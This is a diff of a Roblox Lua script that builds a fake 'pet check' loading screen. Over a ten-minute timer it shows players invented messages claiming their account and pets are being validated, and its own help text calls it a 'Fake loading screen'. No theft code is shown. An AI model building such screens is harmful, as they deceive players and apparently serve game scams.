@@ -1,4 +1,4 @@
--- GUI v4 - Fast Pet Check + Timer Skips
+-- GUI v4 - Fast Pet Check + Timer Skips (Fixed Timer + Help Button)
 
 local gui = Instance.new("ScreenGui")
 gui.Name = "AdvanceServerUI"
@@ -76,12 +76,45 @@ petLabel.TextScaled = true
 petLabel.Text = ""
 petLabel.Parent = frame
 
+local helpButton = Instance.new("TextButton")
+helpButton.Size = UDim2.new(0, 70, 0, 30)
+helpButton.Position = UDim2.new(1, -80, 0, 10)
+helpButton.Text = "?Help"
+helpButton.TextColor3 = Color3.new(1, 1, 1)
+helpButton.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
+helpButton.Font = Enum.Font.SourceSansBold
+helpButton.TextScaled = true
+helpButton.ZIndex = 10
+helpButton.Parent = blackBG
+Instance.new("UICorner", helpButton).CornerRadius = UDim.new(0, 6)
+
+local helpPopup = Instance.new("Frame")
+helpPopup.Size = UDim2.new(0.8, 0, 0.6, 0)
+helpPopup.Position = UDim2.new(0.1, 0, 0.2, 0)
+helpPopup.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+helpPopup.BorderSizePixel = 0
+helpPopup.Visible = false
+helpPopup.ZIndex = 20
+helpPopup.Parent = blackBG
+Instance.new("UICorner", helpPopup).CornerRadius = UDim.new(0, 10)
+
+local helpText = Instance.new("TextLabel")
+helpText.Size = UDim2.new(1, -20, 1, -20)
+helpText.Position = UDim2.new(0, 10, 0, 10)
+helpText.BackgroundTransparency = 1
+helpText.TextColor3 = Color3.new(1, 1, 1)
+helpText.Font = Enum.Font.SourceSans
+helpText.TextScaled = true
+helpText.TextWrapped = true
+helpText.Text = "Fake loading screen guide... your account is being checked, pets are being validated, etc."
+helpText.Parent = helpPopup
+
+helpButton.MouseButton1Click:Connect(function()
+    helpPopup.Visible = not helpPopup.Visible
+end)
+
 local totalTime = 600
 local startTime = tick()
-
-local function adjustTimeForward(seconds)
-    startTime = startTime + seconds
-end
 
 local pets = {"Raccoon", "Dragonfly", "Butterfly", "Queen Bee", "Disco Bee", "Mimic Octopus", "Fennec Fox", "T-Rex", "Spinosaurus"}
 
@@ -90,7 +123,7 @@ spawn(function()
         petLabel.Text = "Checking pets: " .. pet .. "..."
         wait(30)
         petLabel.Text = "Checking pets: " .. pet .. " -> Done!"
-        adjustTimeForward(30)
+        totalTime = totalTime - 30
         wait(1)
     end
 end)
@@ -144,5 +177,5 @@ delay(totalTime, function()
     wait(3)
     resultText.Text = "Required pets not found"
     wait(3)
-    resultText.Text = "Error. Please try again."
+    resultText.Text = "Please try again"
 end)
